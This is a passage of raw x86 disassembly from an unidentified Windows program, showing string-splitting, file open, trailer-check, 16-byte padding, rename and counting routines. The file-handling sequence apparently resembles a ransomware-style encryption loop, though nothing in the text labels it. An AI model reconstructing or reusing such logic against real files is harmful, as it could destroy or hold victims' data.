  403069:	c3                   	ret
  40306a:	cc                   	int3
  40306b:	cc                   	int3
  40306c:	cc                   	int3
  40306d:	cc                   	int3
  40306e:	cc                   	int3
  40306f:	cc                   	int3
  403070:	56                   	push   %esi
  403071:	8b 30                	mov    (%eax),%esi
  403073:	85 f6                	test   %esi,%esi
  403075:	74 14                	je     0x40308b
  403077:	8b 16                	mov    (%esi),%edx
  403079:	8b c7                	mov    %edi,%eax
  40307b:	e8 70 0f 00 00       	call   0x403ff0
  403080:	85 c0                	test   %eax,%eax
  403082:	74 0b                	je     0x40308f
  403084:	8b 76 04             	mov    0x4(%esi),%esi
  403087:	85 f6                	test   %esi,%esi
  403089:	75 ec                	jne    0x403077
  40308b:	32 c0                	xor    %al,%al
  40308d:	5e                   	pop    %esi
  40308e:	c3                   	ret
  40308f:	b0 01                	mov    $0x1,%al
  403091:	5e                   	pop    %esi
  403092:	c3                   	ret
  403093:	cc                   	int3
  403094:	cc                   	int3
  403095:	cc                   	int3
  403096:	cc                   	int3
  403097:	cc                   	int3
  403098:	cc                   	int3
  403099:	cc                   	int3
  40309a:	cc                   	int3
  40309b:	cc                   	int3
  40309c:	cc                   	int3
  40309d:	cc                   	int3
  40309e:	cc                   	int3
  40309f:	cc                   	int3
  4030a0:	53                   	push   %ebx
  4030a1:	55                   	push   %ebp
  4030a2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  4030a6:	56                   	push   %esi
  4030a7:	8b d8                	mov    %eax,%ebx
  4030a9:	33 f6                	xor    %esi,%esi
  4030ab:	80 3b 00             	cmpb   $0x0,(%ebx)
  4030ae:	74 13                	je     0x4030c3
  4030b0:	80 38 3b             	cmpb   $0x3b,(%eax)
  4030b3:	75 06                	jne    0x4030bb
  4030b5:	c6 00 00             	movb   $0x0,(%eax)
  4030b8:	83 c6 01             	add    $0x1,%esi
  4030bb:	83 c0 01             	add    $0x1,%eax
  4030be:	80 38 00             	cmpb   $0x0,(%eax)
  4030c1:	75 ed                	jne    0x4030b0
  4030c3:	8d 04 b5 00 00 00 00 	lea    0x0(,%esi,4),%eax
  4030ca:	85 c0                	test   %eax,%eax
  4030cc:	74 12                	je     0x4030e0
  4030ce:	50                   	push   %eax
  4030cf:	6a 00                	push   $0x0
  4030d1:	ff 15 90 80 40 00    	call   *0x408090
  4030d7:	50                   	push   %eax
  4030d8:	ff 15 84 80 40 00    	call   *0x408084
  4030de:	eb 02                	jmp    0x4030e2
  4030e0:	33 c0                	xor    %eax,%eax
  4030e2:	85 c0                	test   %eax,%eax
  4030e4:	89 45 04             	mov    %eax,0x4(%ebp)
  4030e7:	74 65                	je     0x40314e
  4030e9:	57                   	push   %edi
  4030ea:	33 ff                	xor    %edi,%edi
  4030ec:	85 f6                	test   %esi,%esi
  4030ee:	89 75 00             	mov    %esi,0x0(%ebp)
  4030f1:	7e 5a                	jle    0x40314d
  4030f3:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4030f7:	33 c0                	xor    %eax,%eax
  4030f9:	85 c9                	test   %ecx,%ecx
  4030fb:	76 10                	jbe    0x40310d
  4030fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  403100:	80 3c 18 00          	cmpb   $0x0,(%eax,%ebx,1)
  403104:	74 07                	je     0x40310d
  403106:	83 c0 01             	add    $0x1,%eax
  403109:	3b c1                	cmp    %ecx,%eax
  40310b:	72 f3                	jb     0x403100
  40310d:	8d 70 01             	lea    0x1(%eax),%esi
  403110:	85 f6                	test   %esi,%esi
  403112:	74 12                	je     0x403126
  403114:	56                   	push   %esi
  403115:	6a 00                	push   $0x0
  403117:	ff 15 90 80 40 00    	call   *0x408090
  40311d:	50                   	push   %eax
  40311e:	ff 15 84 80 40 00    	call   *0x408084
  403124:	eb 02                	jmp    0x403128
  403126:	33 c0                	xor    %eax,%eax
  403128:	8b 4d 04             	mov    0x4(%ebp),%ecx
  40312b:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  40312e:	8b 55 04             	mov    0x4(%ebp),%edx
  403131:	8b 04 ba             	mov    (%edx,%edi,4),%eax
  403134:	56                   	push   %esi
  403135:	53                   	push   %ebx
  403136:	50                   	push   %eax
  403137:	e8 04 e0 ff ff       	call   0x401140
  40313c:	29 74 24 24          	sub    %esi,0x24(%esp)
  403140:	83 c7 01             	add    $0x1,%edi
  403143:	83 c4 0c             	add    $0xc,%esp
  403146:	03 de                	add    %esi,%ebx
  403148:	3b 7d 00             	cmp    0x0(%ebp),%edi
  40314b:	7c a6                	jl     0x4030f3
  40314d:	5f                   	pop    %edi
  40314e:	5e                   	pop    %esi
  40314f:	5d                   	pop    %ebp
  403150:	5b                   	pop    %ebx
  403151:	c2 08 00             	ret    $0x8
  403154:	cc                   	int3
  403155:	cc                   	int3
  403156:	cc                   	int3
  403157:	cc                   	int3
  403158:	cc                   	int3
  403159:	cc                   	int3
  40315a:	cc                   	int3
  40315b:	cc                   	int3
  40315c:	cc                   	int3
  40315d:	cc                   	int3
  40315e:	cc                   	int3
  40315f:	cc                   	int3
  403160:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  403164:	74 56                	je     0x4031bc
  403166:	53                   	push   %ebx
  403167:	8b 1d 8c 80 40 00    	mov    0x40808c,%ebx
  40316d:	55                   	push   %ebp
  40316e:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  403174:	57                   	push   %edi
  403175:	33 ff                	xor    %edi,%edi
  403177:	39 3e                	cmp    %edi,(%esi)
  403179:	7e 2c                	jle    0x4031a7
  40317b:	eb 03                	jmp    0x403180
  40317d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403180:	8b 46 04             	mov    0x4(%esi),%eax
  403183:	83 3c b8 00          	cmpl   $0x0,(%eax,%edi,4)
  403187:	8d 04 b8             	lea    (%eax,%edi,4),%eax
  40318a:	74 14                	je     0x4031a0
  40318c:	8b 00                	mov    (%eax),%eax
  40318e:	50                   	push   %eax
  40318f:	6a 00                	push   $0x0
  403191:	ff d5                	call   *%ebp
  403193:	50                   	push   %eax
  403194:	ff d3                	call   *%ebx
  403196:	8b 4e 04             	mov    0x4(%esi),%ecx
  403199:	c7 04 b9 00 00 00 00 	movl   $0x0,(%ecx,%edi,4)
  4031a0:	83 c7 01             	add    $0x1,%edi
  4031a3:	3b 3e                	cmp    (%esi),%edi
  4031a5:	7c d9                	jl     0x403180
  4031a7:	8b 46 04             	mov    0x4(%esi),%eax
  4031aa:	50                   	push   %eax
  4031ab:	6a 00                	push   $0x0
  4031ad:	ff d5                	call   *%ebp
  4031af:	50                   	push   %eax
  4031b0:	ff d3                	call   *%ebx
  4031b2:	5f                   	pop    %edi
  4031b3:	5d                   	pop    %ebp
  4031b4:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  4031bb:	5b                   	pop    %ebx
  4031bc:	c3                   	ret
  4031bd:	cc                   	int3
  4031be:	cc                   	int3
  4031bf:	cc                   	int3
  4031c0:	53                   	push   %ebx
  4031c1:	55                   	push   %ebp
  4031c2:	8b 2d 4c b2 41 00    	mov    0x41b24c,%ebp
  4031c8:	56                   	push   %esi
  4031c9:	8b d8                	mov    %eax,%ebx
  4031cb:	33 f6                	xor    %esi,%esi
  4031cd:	66 39 33             	cmp    %si,(%ebx)
  4031d0:	74 17                	je     0x4031e9
  4031d2:	66 83 38 3b          	cmpw   $0x3b,(%eax)
  4031d6:	75 08                	jne    0x4031e0
  4031d8:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4031dd:	83 c6 01             	add    $0x1,%esi
  4031e0:	83 c0 02             	add    $0x2,%eax
  4031e3:	66 83 38 00          	cmpw   $0x0,(%eax)
  4031e7:	75 e9                	jne    0x4031d2
  4031e9:	8d 04 b5 00 00 00 00 	lea    0x0(,%esi,4),%eax
  4031f0:	85 c0                	test   %eax,%eax
  4031f2:	74 12                	je     0x403206
  4031f4:	50                   	push   %eax
  4031f5:	6a 00                	push   $0x0
  4031f7:	ff 15 90 80 40 00    	call   *0x408090
  4031fd:	50                   	push   %eax
  4031fe:	ff 15 84 80 40 00    	call   *0x408084
  403204:	eb 02                	jmp    0x403208
  403206:	33 c0                	xor    %eax,%eax
  403208:	85 c0                	test   %eax,%eax
  40320a:	89 45 04             	mov    %eax,0x4(%ebp)
  40320d:	74 5f                	je     0x40326e
  40320f:	57                   	push   %edi
  403210:	33 ff                	xor    %edi,%edi
  403212:	85 f6                	test   %esi,%esi
  403214:	89 75 00             	mov    %esi,0x0(%ebp)
  403217:	7e 54                	jle    0x40326d
  403219:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403220:	8b c3                	mov    %ebx,%eax
  403222:	66 8b 08             	mov    (%eax),%cx
  403225:	83 c0 02             	add    $0x2,%eax
  403228:	66 85 c9             	test   %cx,%cx
  40322b:	75 f5                	jne    0x403222
  40322d:	2b c3                	sub    %ebx,%eax
  40322f:	d1 f8                	sar    $1,%eax
  403231:	8d 34 00             	lea    (%eax,%eax,1),%esi
  403234:	85 f6                	test   %esi,%esi
  403236:	74 12                	je     0x40324a
  403238:	56                   	push   %esi
  403239:	6a 00                	push   $0x0
  40323b:	ff 15 90 80 40 00    	call   *0x408090
  403241:	50                   	push   %eax
  403242:	ff 15 84 80 40 00    	call   *0x408084
  403248:	eb 02                	jmp    0x40324c
  40324a:	33 c0                	xor    %eax,%eax
  40324c:	8b 55 04             	mov    0x4(%ebp),%edx
  40324f:	89 04 ba             	mov    %eax,(%edx,%edi,4)
  403252:	8b 45 04             	mov    0x4(%ebp),%eax
  403255:	8b 0c b8             	mov    (%eax,%edi,4),%ecx
  403258:	56                   	push   %esi
  403259:	53                   	push   %ebx
  40325a:	51                   	push   %ecx
  40325b:	e8 e0 de ff ff       	call   0x401140
  403260:	83 c7 01             	add    $0x1,%edi
  403263:	83 c4 0c             	add    $0xc,%esp
  403266:	03 de                	add    %esi,%ebx
  403268:	3b 7d 00             	cmp    0x0(%ebp),%edi
  40326b:	7c b3                	jl     0x403220
  40326d:	5f                   	pop    %edi
  40326e:	5e                   	pop    %esi
  40326f:	5d                   	pop    %ebp
  403270:	5b                   	pop    %ebx
  403271:	c3                   	ret
  403272:	cc                   	int3
  403273:	cc                   	int3
  403274:	cc                   	int3
  403275:	cc                   	int3
  403276:	cc                   	int3
  403277:	cc                   	int3
  403278:	cc                   	int3
  403279:	cc                   	int3
  40327a:	cc                   	int3
  40327b:	cc                   	int3
  40327c:	cc                   	int3
  40327d:	cc                   	int3
  40327e:	cc                   	int3
  40327f:	cc                   	int3
  403280:	55                   	push   %ebp
  403281:	8b ec                	mov    %esp,%ebp
  403283:	8b 45 10             	mov    0x10(%ebp),%eax
  403286:	83 e8 01             	sub    $0x1,%eax
  403289:	89 45 10             	mov    %eax,0x10(%ebp)
  40328c:	74 24                	je     0x4032b2
  40328e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403291:	0f be 11             	movsbl (%ecx),%edx
  403294:	8b 45 0c             	mov    0xc(%ebp),%eax
  403297:	0f be 08             	movsbl (%eax),%ecx
  40329a:	3b d1                	cmp    %ecx,%edx
  40329c:	75 14                	jne    0x4032b2
  40329e:	8b 55 08             	mov    0x8(%ebp),%edx
  4032a1:	83 c2 01             	add    $0x1,%edx
  4032a4:	89 55 08             	mov    %edx,0x8(%ebp)
  4032a7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4032aa:	83 c0 01             	add    $0x1,%eax
  4032ad:	89 45 0c             	mov    %eax,0xc(%ebp)
  4032b0:	eb d1                	jmp    0x403283
  4032b2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4032b5:	0f b6 01             	movzbl (%ecx),%eax
  4032b8:	8b 55 0c             	mov    0xc(%ebp),%edx
  4032bb:	0f b6 0a             	movzbl (%edx),%ecx
  4032be:	2b c1                	sub    %ecx,%eax
  4032c0:	5d                   	pop    %ebp
  4032c1:	c3                   	ret
  4032c2:	cc                   	int3
  4032c3:	cc                   	int3
  4032c4:	cc                   	int3
  4032c5:	cc                   	int3
  4032c6:	cc                   	int3
  4032c7:	cc                   	int3
  4032c8:	cc                   	int3
  4032c9:	cc                   	int3
  4032ca:	cc                   	int3
  4032cb:	cc                   	int3
  4032cc:	cc                   	int3
  4032cd:	cc                   	int3
  4032ce:	cc                   	int3
  4032cf:	cc                   	int3
  4032d0:	83 ec 18             	sub    $0x18,%esp
  4032d3:	57                   	push   %edi
  4032d4:	8b 3d a8 80 40 00    	mov    0x4080a8,%edi
  4032da:	6a 02                	push   $0x2
  4032dc:	8d 54 24 14          	lea    0x14(%esp),%edx
  4032e0:	52                   	push   %edx
  4032e1:	33 c9                	xor    %ecx,%ecx
  4032e3:	51                   	push   %ecx
  4032e4:	33 c0                	xor    %eax,%eax
  4032e6:	50                   	push   %eax
  4032e7:	56                   	push   %esi
  4032e8:	ff d7                	call   *%edi
  4032ea:	85 c0                	test   %eax,%eax
  4032ec:	74 6b                	je     0x403359
  4032ee:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  4032f3:	7f 10                	jg     0x403305
  4032f5:	7c 07                	jl     0x4032fe
  4032f7:	83 7c 24 10 04       	cmpl   $0x4,0x10(%esp)
  4032fc:	73 07                	jae    0x403305
  4032fe:	b0 01                	mov    $0x1,%al
  403300:	5f                   	pop    %edi
  403301:	83 c4 18             	add    $0x18,%esp
  403304:	c3                   	ret
  403305:	6a 02                	push   $0x2
  403307:	6a 00                	push   $0x0
  403309:	83 c9 ff             	or     $0xffffffff,%ecx
  40330c:	51                   	push   %ecx
  40330d:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  403312:	50                   	push   %eax
  403313:	56                   	push   %esi
  403314:	ff d7                	call   *%edi
  403316:	85 c0                	test   %eax,%eax
  403318:	74 3f                	je     0x403359
  40331a:	6a 00                	push   $0x0
  40331c:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403320:	50                   	push   %eax
  403321:	6a 04                	push   $0x4
  403323:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  403327:	51                   	push   %ecx
  403328:	56                   	push   %esi
  403329:	ff 15 70 80 40 00    	call   *0x408070
  40332f:	85 c0                	test   %eax,%eax
  403331:	74 26                	je     0x403359
  403333:	83 7c 24 08 04       	cmpl   $0x4,0x8(%esp)
  403338:	75 1f                	jne    0x403359
  40333a:	6a 04                	push   $0x4
  40333c:	8d 54 24 10          	lea    0x10(%esp),%edx
  403340:	68 14 90 41 00       	push   $0x419014
  403345:	52                   	push   %edx
  403346:	e8 35 ff ff ff       	call   0x403280
  40334b:	83 c4 0c             	add    $0xc,%esp
  40334e:	f7 d8                	neg    %eax
  403350:	1b c0                	sbb    %eax,%eax
  403352:	f7 d8                	neg    %eax
  403354:	5f                   	pop    %edi
  403355:	83 c4 18             	add    $0x18,%esp
  403358:	c3                   	ret
  403359:	32 c0                	xor    %al,%al
  40335b:	5f                   	pop    %edi
  40335c:	83 c4 18             	add    $0x18,%esp
  40335f:	c3                   	ret
  403360:	51                   	push   %ecx
  403361:	53                   	push   %ebx
  403362:	55                   	push   %ebp
  403363:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  403367:	80 7d 22 00          	cmpb   $0x0,0x22(%ebp)
  40336b:	56                   	push   %esi
  40336c:	57                   	push   %edi
  40336d:	75 11                	jne    0x403380
  40336f:	80 3d 08 90 40 00 00 	cmpb   $0x0,0x409008
  403376:	0f 94 c0             	sete   %al
  403379:	84 c0                	test   %al,%al
  40337b:	88 45 22             	mov    %al,0x22(%ebp)
  40337e:	74 0c                	je     0x40338c
  403380:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403384:	53                   	push   %ebx
  403385:	e8 46 32 00 00       	call   0x4065d0
  40338a:	eb 0c                	jmp    0x403398
  40338c:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403390:	51                   	push   %ecx
  403391:	e8 3a 32 00 00       	call   0x4065d0
  403396:	8b d9                	mov    %ecx,%ebx
  403398:	83 c4 04             	add    $0x4,%esp
  40339b:	80 7d 23 00          	cmpb   $0x0,0x23(%ebp)
  40339f:	74 0e                	je     0x4033af
  4033a1:	8b 55 24             	mov    0x24(%ebp),%edx
  4033a4:	83 e2 fe             	and    $0xfffffffe,%edx
  4033a7:	52                   	push   %edx
  4033a8:	53                   	push   %ebx
  4033a9:	ff 15 80 80 40 00    	call   *0x408080
  4033af:	8b 3d 74 80 40 00    	mov    0x408074,%edi
  4033b5:	6a 00                	push   $0x0
  4033b7:	68 80 00 00 00       	push   $0x80
  4033bc:	6a 03                	push   $0x3
  4033be:	6a 00                	push   $0x0
  4033c0:	6a 04                	push   $0x4
  4033c2:	68 00 00 00 c0       	push   $0xc0000000
  4033c7:	53                   	push   %ebx
  4033c8:	c6 44 24 38 00       	movb   $0x0,0x38(%esp)
  4033cd:	ff d7                	call   *%edi
  4033cf:	8b f0                	mov    %eax,%esi
  4033d1:	83 fe ff             	cmp    $0xffffffff,%esi
  4033d4:	75 64                	jne    0x40343a
  4033d6:	ff 15 04 81 40 00    	call   *0x408104
  4033dc:	53                   	push   %ebx
  4033dd:	50                   	push   %eax
  4033de:	e8 ed 31 00 00       	call   0x4065d0
  4033e3:	83 c4 08             	add    $0x8,%esp
  4033e6:	80 3d 0a 90 40 00 00 	cmpb   $0x0,0x40900a
  4033ed:	0f 84 54 01 00 00    	je     0x403547
  4033f3:	83 f8 20             	cmp    $0x20,%eax
  4033f6:	74 09                	je     0x403401
  4033f8:	83 f8 05             	cmp    $0x5,%eax
  4033fb:	0f 85 46 01 00 00    	jne    0x403547
  403401:	53                   	push   %ebx
  403402:	e8 59 18 00 00       	call   0x404c60
  403407:	83 c4 04             	add    $0x4,%esp
  40340a:	84 c0                	test   %al,%al
  40340c:	0f 84 35 01 00 00    	je     0x403547
  403412:	6a 0a                	push   $0xa
  403414:	ff 15 fc 80 40 00    	call   *0x4080fc
  40341a:	6a 00                	push   $0x0
  40341c:	68 80 00 00 00       	push   $0x80
  403421:	6a 03                	push   $0x3
  403423:	6a 00                	push   $0x0
  403425:	6a 04                	push   $0x4
  403427:	68 00 00 00 c0       	push   $0xc0000000
  40342c:	53                   	push   %ebx
  40342d:	ff d7                	call   *%edi
  40342f:	8b f0                	mov    %eax,%esi
  403431:	83 fe ff             	cmp    $0xffffffff,%esi
  403434:	0f 84 0d 01 00 00    	je     0x403547
  40343a:	c6 44 24 13 00       	movb   $0x0,0x13(%esp)
  40343f:	e8 8c fe ff ff       	call   0x4032d0
  403444:	84 c0                	test   %al,%al
  403446:	0f 84 af 00 00 00    	je     0x4034fb
  40344c:	80 7d 22 00          	cmpb   $0x0,0x22(%ebp)
  403450:	56                   	push   %esi
  403451:	74 0e                	je     0x403461
  403453:	53                   	push   %ebx
  403454:	8b dd                	mov    %ebp,%ebx
  403456:	e8 85 01 00 00       	call   0x4035e0
  40345b:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40345f:	eb 08                	jmp    0x403469
  403461:	55                   	push   %ebp
  403462:	8b c3                	mov    %ebx,%eax
  403464:	e8 77 07 00 00       	call   0x403be0
  403469:	83 c4 08             	add    $0x8,%esp
  40346c:	84 c0                	test   %al,%al
  40346e:	88 44 24 1c          	mov    %al,0x1c(%esp)
  403472:	0f 84 83 00 00 00    	je     0x4034fb
  403478:	8d 45 2c             	lea    0x2c(%ebp),%eax
  40347b:	8b d3                	mov    %ebx,%edx
  40347d:	bf ff 7f 00 00       	mov    $0x7fff,%edi
  403482:	8b d8                	mov    %eax,%ebx
  403484:	e8 a7 0a 00 00       	call   0x403f30
  403489:	8d 95 2a 00 01 00    	lea    0x1002a(%ebp),%edx
  40348f:	8d 45 2c             	lea    0x2c(%ebp),%eax
  403492:	66 83 38 00          	cmpw   $0x0,(%eax)
  403496:	74 08                	je     0x4034a0
  403498:	83 c0 02             	add    $0x2,%eax
  40349b:	83 ef 01             	sub    $0x1,%edi
  40349e:	75 f2                	jne    0x403492
  4034a0:	85 ff                	test   %edi,%edi
  4034a2:	74 21                	je     0x4034c5
  4034a4:	0f b7 0a             	movzwl (%edx),%ecx
  4034a7:	66 89 08             	mov    %cx,(%eax)
  4034aa:	83 c0 02             	add    $0x2,%eax
  4034ad:	83 c2 02             	add    $0x2,%edx
  4034b0:	66 85 c9             	test   %cx,%cx
  4034b3:	74 05                	je     0x4034ba
  4034b5:	83 ef 01             	sub    $0x1,%edi
  4034b8:	75 ea                	jne    0x4034a4
  4034ba:	85 ff                	test   %edi,%edi
  4034bc:	75 07                	jne    0x4034c5
  4034be:	66 89 bd 28 00 01 00 	mov    %di,0x10028(%ebp)
  4034c5:	8d 45 2c             	lea    0x2c(%ebp),%eax
  4034c8:	50                   	push   %eax
  4034c9:	e8 02 31 00 00       	call   0x4065d0
  4034ce:	83 c4 04             	add    $0x4,%esp
  4034d1:	50                   	push   %eax
  4034d2:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4034d6:	50                   	push   %eax
  4034d7:	ff 15 7c 80 40 00    	call   *0x40807c
  4034dd:	85 c0                	test   %eax,%eax
  4034df:	74 07                	je     0x4034e8
  4034e1:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  4034e6:	eb 0f                	jmp    0x4034f7
  4034e8:	ff 15 04 81 40 00    	call   *0x408104
  4034ee:	50                   	push   %eax
  4034ef:	e8 dc 30 00 00       	call   0x4065d0
  4034f4:	83 c4 04             	add    $0x4,%esp
  4034f7:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4034fb:	56                   	push   %esi
  4034fc:	ff 15 48 81 40 00    	call   *0x408148
  403502:	8a 54 24 1c          	mov    0x1c(%esp),%dl
  403506:	80 fa 01             	cmp    $0x1,%dl
  403509:	75 1f                	jne    0x40352a
  40350b:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  403510:	75 18                	jne    0x40352a
  403512:	8d 4d 2c             	lea    0x2c(%ebp),%ecx
  403515:	51                   	push   %ecx
  403516:	53                   	push   %ebx
  403517:	ff 15 7c 80 40 00    	call   *0x40807c
  40351d:	85 c0                	test   %eax,%eax
  40351f:	8a 54 24 1c          	mov    0x1c(%esp),%dl
  403523:	74 05                	je     0x40352a
  403525:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  40352a:	80 7d 23 00          	cmpb   $0x0,0x23(%ebp)
  40352e:	74 1b                	je     0x40354b
  403530:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  403535:	8d 45 2c             	lea    0x2c(%ebp),%eax
  403538:	75 02                	jne    0x40353c
  40353a:	8b c3                	mov    %ebx,%eax
  40353c:	8b 55 24             	mov    0x24(%ebp),%edx
  40353f:	52                   	push   %edx
  403540:	50                   	push   %eax
  403541:	ff 15 80 80 40 00    	call   *0x408080
  403547:	8a 54 24 1c          	mov    0x1c(%esp),%dl
  40354b:	a1 50 b2 41 00       	mov    0x41b250,%eax
  403550:	8b 30                	mov    (%eax),%esi
  403552:	85 f6                	test   %esi,%esi
  403554:	8b ce                	mov    %esi,%ecx
  403556:	74 71                	je     0x4035c9
  403558:	8b 41 04             	mov    0x4(%ecx),%eax
  40355b:	85 c0                	test   %eax,%eax
  40355d:	74 0a                	je     0x403569
  40355f:	90                   	nop
  403560:	8b c8                	mov    %eax,%ecx
  403562:	8b 41 04             	mov    0x4(%ecx),%eax
  403565:	85 c0                	test   %eax,%eax
  403567:	75 f7                	jne    0x403560
  403569:	83 39 00             	cmpl   $0x0,(%ecx)
  40356c:	74 5b                	je     0x4035c9
  40356e:	8b 46 04             	mov    0x4(%esi),%eax
  403571:	85 c0                	test   %eax,%eax
  403573:	74 07                	je     0x40357c
  403575:	8b 40 04             	mov    0x4(%eax),%eax
  403578:	85 c0                	test   %eax,%eax
  40357a:	75 f9                	jne    0x403575
  40357c:	8b 45 28             	mov    0x28(%ebp),%eax
  40357f:	be 01 00 00 00       	mov    $0x1,%esi
  403584:	01 b0 34 00 01 00    	add    %esi,0x10034(%eax)
  40358a:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40358d:	01 88 40 00 01 00    	add    %ecx,0x10040(%eax)
  403593:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  403596:	11 88 44 00 01 00    	adc    %ecx,0x10044(%eax)
  40359c:	84 d2                	test   %dl,%dl
  40359e:	74 2e                	je     0x4035ce
  4035a0:	01 b0 38 00 01 00    	add    %esi,0x10038(%eax)
  4035a6:	8b 4d 18             	mov    0x18(%ebp),%ecx
  4035a9:	01 88 48 00 01 00    	add    %ecx,0x10048(%eax)
  4035af:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  4035b2:	53                   	push   %ebx
  4035b3:	11 88 4c 00 01 00    	adc    %ecx,0x1004c(%eax)
  4035b9:	e8 12 30 00 00       	call   0x4065d0
  4035be:	83 c4 04             	add    $0x4,%esp
  4035c1:	8a c2                	mov    %dl,%al
  4035c3:	5f                   	pop    %edi
  4035c4:	5e                   	pop    %esi
  4035c5:	5d                   	pop    %ebp
  4035c6:	5b                   	pop    %ebx
  4035c7:	59                   	pop    %ecx
  4035c8:	c3                   	ret
  4035c9:	e8 02 30 00 00       	call   0x4065d0
  4035ce:	53                   	push   %ebx
  4035cf:	e8 fc 2f 00 00       	call   0x4065d0
  4035d4:	83 c4 04             	add    $0x4,%esp
  4035d7:	5f                   	pop    %edi
  4035d8:	5e                   	pop    %esi
  4035d9:	5d                   	pop    %ebp
  4035da:	8a c2                	mov    %dl,%al
  4035dc:	5b                   	pop    %ebx
  4035dd:	59                   	pop    %ecx
  4035de:	c3                   	ret
  4035df:	cc                   	int3
  4035e0:	83 ec 48             	sub    $0x48,%esp
  4035e3:	55                   	push   %ebp
  4035e4:	8b 6c 24 54          	mov    0x54(%esp),%ebp
  4035e8:	56                   	push   %esi
  4035e9:	33 f6                	xor    %esi,%esi
  4035eb:	57                   	push   %edi
  4035ec:	89 74 24 14          	mov    %esi,0x14(%esp)
  4035f0:	c6 44 24 0f 00       	movb   $0x0,0xf(%esp)
  4035f5:	89 74 24 28          	mov    %esi,0x28(%esp)
  4035f9:	89 74 24 2c          	mov    %esi,0x2c(%esp)
  4035fd:	33 ff                	xor    %edi,%edi
  4035ff:	89 74 24 38          	mov    %esi,0x38(%esp)
  403603:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  403607:	e8 d4 f0 ff ff       	call   0x4026e0
  40360c:	85 c0                	test   %eax,%eax
  40360e:	89 44 24 20          	mov    %eax,0x20(%esp)
  403612:	0f 84 c6 04 00 00    	je     0x403ade
  403618:	8b 03                	mov    (%ebx),%eax
  40361a:	8a 48 30             	mov    0x30(%eax),%cl
  40361d:	6a 02                	push   $0x2
  40361f:	8d 54 24 34          	lea    0x34(%esp),%edx
  403623:	52                   	push   %edx
  403624:	80 f9 01             	cmp    $0x1,%cl
  403627:	88 4c 24 16          	mov    %cl,0x16(%esp)
  40362b:	57                   	push   %edi
  40362c:	0f 94 c1             	sete   %cl
  40362f:	56                   	push   %esi
  403630:	80 c1 01             	add    $0x1,%cl
  403633:	55                   	push   %ebp
  403634:	88 48 30             	mov    %cl,0x30(%eax)
  403637:	ff 15 a8 80 40 00    	call   *0x4080a8
  40363d:	85 c0                	test   %eax,%eax
  40363f:	0f 84 85 04 00 00    	je     0x403aca
  403645:	8b 44 24 30          	mov    0x30(%esp),%eax
  403649:	83 e0 0f             	and    $0xf,%eax
  40364c:	74 3b                	je     0x403689
  40364e:	be 10 00 00 00       	mov    $0x10,%esi
  403653:	2b f0                	sub    %eax,%esi
  403655:	56                   	push   %esi
  403656:	8d 44 24 44          	lea    0x44(%esp),%eax
  40365a:	57                   	push   %edi
  40365b:	50                   	push   %eax
  40365c:	e8 9f da ff ff       	call   0x401100
  403661:	83 c4 0c             	add    $0xc,%esp
  403664:	57                   	push   %edi
  403665:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403669:	51                   	push   %ecx
  40366a:	56                   	push   %esi
  40366b:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  40366f:	52                   	push   %edx
  403670:	55                   	push   %ebp
  403671:	ff 15 f8 80 40 00    	call   *0x4080f8
  403677:	85 c0                	test   %eax,%eax
  403679:	0f 84 4b 04 00 00    	je     0x403aca
  40367f:	39 74 24 10          	cmp    %esi,0x10(%esp)
  403683:	0f 82 41 04 00 00    	jb     0x403aca
  403689:	80 7c 24 0e 01       	cmpb   $0x1,0xe(%esp)
  40368e:	75 07                	jne    0x403697
  403690:	8b 03                	mov    (%ebx),%eax
  403692:	8b 40 20             	mov    0x20(%eax),%eax
  403695:	eb 05                	jmp    0x40369c
  403697:	8b 0b                	mov    (%ebx),%ecx
  403699:	8b 41 28             	mov    0x28(%ecx),%eax
  40369c:	8b 54 24 20          	mov    0x20(%esp),%edx
  4036a0:	52                   	push   %edx
  4036a1:	50                   	push   %eax
  4036a2:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  4036a6:	e8 15 f4 ff ff       	call   0x402ac0
  4036ab:	84 c0                	test   %al,%al
  4036ad:	0f 84 17 04 00 00    	je     0x403aca
  4036b3:	8b 74 24 58          	mov    0x58(%esp),%esi
  4036b7:	ba 5c 00 00 00       	mov    $0x5c,%edx
  4036bc:	8b c6                	mov    %esi,%eax
  4036be:	e8 fd 09 00 00       	call   0x4040c0
  4036c3:	8b f8                	mov    %eax,%edi
  4036c5:	85 ff                	test   %edi,%edi
  4036c7:	74 05                	je     0x4036ce
  4036c9:	83 c7 02             	add    $0x2,%edi
  4036cc:	eb 02                	jmp    0x4036d0
  4036ce:	8b fe                	mov    %esi,%edi
  4036d0:	8b c7                	mov    %edi,%eax
  4036d2:	66 8b 08             	mov    (%eax),%cx
  4036d5:	83 c0 02             	add    $0x2,%eax
  4036d8:	66 85 c9             	test   %cx,%cx
  4036db:	75 f5                	jne    0x4036d2
